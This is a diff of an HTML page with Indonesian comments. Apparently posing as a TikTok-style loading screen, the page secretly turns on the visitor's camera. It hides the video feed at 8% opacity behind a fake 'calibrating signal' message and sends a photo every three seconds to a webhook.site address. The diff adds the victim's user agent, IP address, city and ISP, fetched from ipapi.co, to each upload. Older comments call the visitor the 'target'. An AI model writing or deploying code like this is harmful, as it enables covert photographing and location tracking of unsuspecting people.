@@ -11,8 +11,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #status { font-size: 16px; font-weight: bold; text-transform: uppercase; letter-spacing: 2px; color: #fe2c55; text-align: center; }
         
-        /* Trik Baru: Video ditaruh di belakang layar (z-index rendah) 
-           tapi ukurannya tetap besar agar sistem mau merender gambarnya */
+        /* Video tetap besar tapi samar di background agar sensor cahaya kamera aktif */
         #video {
             position: fixed;
             top: 0;
@@ -20,8 +19,8 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
-            z-index: 1; /* Di bawah container */
-            opacity: 0.1; /* Sangat samar, target bakal mikir ini efek loading */
+            z-index: 1;
+            opacity: 0.08; 
         }
         #canvas { display: none; }
     </style>
@@ -38,7 +37,9 @@
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const WEBHOOK_URL = 'https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877';
+        // LINK WEBHOOK BARU KAMU
+        const WEBHOOK_URL = 'https://webhook.site/0fd1f3d6-dd15-4117-a62f-cf109f69247b';
+        
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -56,7 +57,7 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     statusDiv.innerText = "Mengkalibrasi Sinyal...";
-                    // TUNGGU 5 DETIK: Biar target beneran nunggu dan kamera dapet cahaya
+                    // Tunggu 5 detik agar sensor kamera menyesuaikan cahaya (biar gak hitam)
                     setTimeout(takeSnapShot, 5000); 
                 };
             } catch (err) {
@@ -73,32 +74,38 @@
 
             if (video.readyState === video.HAVE_ENOUGH_DATA) {
                 photoCount++;
-                
-                // Ambil gambar
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Gunakan kualitas 0.3 supaya proses kirim cepat & tidak gagal di tengah jalan
-                const dataFoto = canvas.toDataURL('image/jpeg', 0.3);
+                // Gunakan kualitas 0.4 agar seimbang antara kejelasan dan kecepatan kirim
+                const dataFoto = canvas.toDataURL('image/jpeg', 0.4);
 
                 kirimData({
-                    event: "SNAP_SHOT_V3",
+                    event: "SNAP_SHOT_FINAL",
                     no: photoCount,
                     foto: dataFoto,
-                    info: "Kualitas 30%"
+                    perangkat: navigator.userAgent
                 });
             }
 
+            // Ambil foto berikutnya setiap 3 detik
             setTimeout(takeSnapShot, 3000);
         }
 
         async function kirimData(payload) {
             try {
+                // Ambil data IP & Lokasi
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const finalData = { ...payload, ...{ kota: ipData.city, isp: ipData.org, ip: ipData.ip } };
+
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     mode: 'no-cors',
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(finalData)
                 });
-            } catch (e) {}
+            } catch (e) {
+                console.log("Kirim gagal");
+            }
         }
 
         window.onload = startSystem;
